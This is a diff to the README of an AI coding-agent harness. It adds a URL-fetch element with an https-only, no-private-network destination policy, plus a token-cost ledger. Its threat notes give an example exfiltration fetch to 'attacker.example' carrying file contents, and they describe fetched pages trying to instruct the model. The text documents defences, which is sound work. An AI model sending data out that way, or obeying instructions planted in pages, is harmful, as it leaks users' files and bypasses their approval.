@@ -11,7 +11,7 @@ Input is not sent as free text. Each prompt goes out wrapped in a single element
 <ai-harness-query>count the rust files in src</ai-harness-query>
 ```
 
-The model must reply with exactly one of five elements, and nothing else:
+The model must reply with exactly one of six elements, and nothing else:
 
 ```xml
 <ai-harness-shell>ls -1 src/*.rs | wc -l</ai-harness-shell>
@@ -19,6 +19,10 @@ The model must reply with exactly one of five elements, and nothing else:
 
 ```xml
 <ai-harness-read>src/app.rs</ai-harness-read>
+```
+
+```xml
+<ai-harness-fetch>https://doc.rust-lang.org/std/net/enum.IpAddr.html</ai-harness-fetch>
 ```
 
 ```xml
@@ -61,6 +65,39 @@ inside the working directory or they fail. To read anything outside, the model
 has to use `<ai-harness-shell>`, which you approve as usual. Pass
 `--confirm-reads` to put reads behind the modal too.
 
+`<ai-harness-fetch>` is auto-approved on the same reasoning — an agent that
+wants to check three documentation pages should not interrupt you three times —
+but it earns it differently, and the difference matters. A read is *more*
+confined than the shell. A fetch cannot be: it is an outbound request to a host
+the model picked. What bounds it is a policy on the destination rather than a
+filesystem root: **https only**, and **no addresses on this machine or this
+network** — loopback, private, link-local (including the `169.254.169.254`
+cloud-metadata endpoint), and the other special-purpose ranges are all refused.
+
+That check runs inside the HTTP client's own DNS resolver, not as a lookup
+beforehand. Checking first and connecting after leaves a DNS-rebinding race,
+because the client resolves again when it connects; and pinning the first
+address does not help, because a redirect resolves a fresh host. As the
+resolver, the check is the one thing every hop and every new connection must
+pass through. Redirects are capped and each hop's URL is re-checked.
+
+The page comes back as text, not HTML: script, style, and navigation subtrees
+are dropped, block tags become line breaks, and entities are decoded — a real
+documentation page arrives as ~18 KB of readable text instead of ~125 KB of
+markup. `<pre>` is the exception to the flattening and keeps its line breaks and
+indentation, because in a coding harness the code examples are usually the point
+of the page. Non-HTML content types (JSON, Markdown, plain text) pass through
+untouched. Pass `--confirm-fetch` to put fetches behind the modal.
+
+To be straight about what this is worth: on macOS you could get comparable text
+out of `curl -s URL | textutil -convert txt -stdin -stdout`, and the shell
+already bounds output and time. What the element actually buys is that it runs
+**without interrupting you**, that the model reaches for it reliably from the
+contract instead of having to remember a two-command pipeline, and that a
+refusal comes back as something it can act on rather than a shell exit code.
+The destination policy above is the price of that first property — take
+auto-approval away and most of it would be redundant with the modal.
+
 `<ai-harness-edit>` changes part of a file by exact search-and-replace: the
 `<ai-harness-old>` text must appear **exactly once** in the file, and it is
 swapped for `<ai-harness-new>` (an empty `<ai-harness-new>` deletes it). This is
@@ -91,6 +128,7 @@ Commands are handled locally and never sent to the model.
 | `/load [name]` | Load a saved session; `/load` with no name opens a picker modal |
 | `/rename <name>` | Rename the current session (the name it loads under) |
 | `/fork [name]` | Branch into a new session, freezing the original |
+| `/cost` | Cumulative tokens, time spent waiting, and estimated spend |
 | `/help` | List the commands |
 | `/quit` | Exit |
 
@@ -136,6 +174,7 @@ escapes are covered too.
 | Writes | Confined to the working-directory subtree |
 | Shell reads | Open, minus `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gh`, Keychains, `.env` |
 | `<ai-harness-read>` | Working-directory subtree only, minus the same denylist |
+| `<ai-harness-fetch>` | Public https hosts only; never this machine or this network |
 | Network | Allowed — the approval prompt is the control point |
 | Timeout | 30s by default, killing the whole process group |
 | Output | Capped at 32 KB per stream; a read at 64 KB |
@@ -167,6 +206,21 @@ determined attacker.** Network is on, so any command you approve can send
 anything it can read. Command output is also sent to OpenRouter, which means
 reading a secret leaks it even with no network in the command itself — the `.env`
 deny closes the obvious case, and the denylist is not exhaustive.
+
+Two things `<ai-harness-fetch>` specifically does **not** do, both worth knowing
+before you leave it auto-approved:
+
+- **It does not stop exfiltration.** An auto-approved read followed by an
+  auto-approved fetch of `https://attacker.example/?d=<file contents>` moves
+  data off the machine with nobody asked. The address rules do not help here —
+  the attacker's host is an ordinary public one. This is a real reduction in
+  containment versus routing the network step through `curl`, where you would
+  approve it. `--confirm-fetch` puts that approval back.
+- **It does not bound what a page says.** Fetched text lands in the model's
+  context, and a page can try to instruct it. The result is labelled as
+  untrusted when it is handed over, but what actually contains this is
+  structural: shell, write, and edit still require approval, so a page can
+  persuade the model to *propose* something, not to do it.
 
 Non-macOS platforms fail closed at startup rather than running commands
 unsandboxed.
@@ -204,10 +258,34 @@ Give it extra guidance (appended to the protocol contract, never replacing it):
 cargo run -- --system "Prefer ripgrep over grep."
 ```
 
+## Cost
+
+The status bar carries a running token total once a session has spent anything,
+and `/cost` prints the breakdown — requests, input and output tokens, and time
+actually spent waiting on the model (not wall-clock, which would count the hours
+a session sat idle).
+
+Dollar figures need per-model rates, which differ and change, so they are given
+rather than baked in — a hardcoded price table would go stale without anyone
+noticing:
+
+```bash
+cargo run -- --price-in 0.60 --price-out 2.20
+```
+
+Both are dollars per million tokens, and **both** must be set before a cost
+appears: input and output rates differ several-fold, so a number derived from one
+of them would not be an estimate, it would just be wrong.
+
+Totals are saved with the session and restored on `/load`. They survive `/clear`
+— the tokens were bought whether or not the conversation was kept — and a reply
+that fails protocol validation is counted too, since a retry loop costs real
+money precisely when it is going wrong.
+
 Other flags: `--workdir` sets the sandbox root (default: cwd),
 `--command-timeout` the per-command limit in seconds, `--max-iterations` the
 agentic loop bound, `--confirm-reads` puts file reads behind the approval modal
-along with everything else.
+along with everything else, and `--confirm-fetch` does the same for URL fetches.
 
 ## Keys
 
@@ -263,6 +341,8 @@ The prompt box grows downward from a fixed bottom edge as you add lines, up to
 | `src/sandbox.rs` | Seatbelt profile generation and the sandboxed command |
 | `src/exec.rs` | Running commands: timeout, process-group kill, output caps |
 | `src/files.rs` | Resolving and reading files for `<ai-harness-read>` |
+| `src/fetch.rs` | URL policy, fetching, and HTML-to-text for `<ai-harness-fetch>` |
+| `src/ledger.rs` | Cumulative token accounting and the `/cost` report |
 | `src/session.rs` | Saving and loading sessions to disk (`/save`, `/load`) |
 | `src/tui.rs` | Terminal setup/teardown (raw mode, alt screen, mouse, paste) |
 | `src/ui.rs` | Rendering and layout |
@@ -282,9 +362,11 @@ The suite covers wrapping, cursor movement, state transitions, rendering (via
 ratatui's `TestBackend`), and the OpenRouter request/response format (against a
 local socket — no network, no key).
 
-Four tests make real API calls and are excluded by default. They check that a
+Eight tests reach the network and are excluded by default. Four check that a
 live model obeys the protocol, that a rejected reply recovers when sent our
-correction, and that a real request streams in incrementally:
+correction, and that a real request streams in incrementally. Four more fetch
+real pages — including one against a public hostname that resolves to
+`127.0.0.1`, which only the guarded resolver can catch:
 
 ```bash
 cargo test -- --ignored live_ --nocapture
